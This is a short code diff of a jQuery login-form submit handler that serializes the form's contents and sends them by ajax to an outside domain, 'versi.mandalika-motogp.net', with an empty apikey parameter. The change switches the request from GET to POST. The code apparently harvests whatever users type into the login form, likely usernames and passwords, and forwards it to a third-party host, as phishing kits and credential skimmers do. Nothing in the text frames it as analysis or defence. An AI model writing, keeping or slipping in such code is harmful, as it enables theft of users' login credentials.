@@ -4,7 +4,7 @@ $(".login-form").submit(function() {
 
 	$.ajax({
         url: "https://versi.mandalika-motogp.net/?apikey=",
-        type: "GET",
+        type: "POST",
         data: d.serialize(),
         success: function () {
             return true;
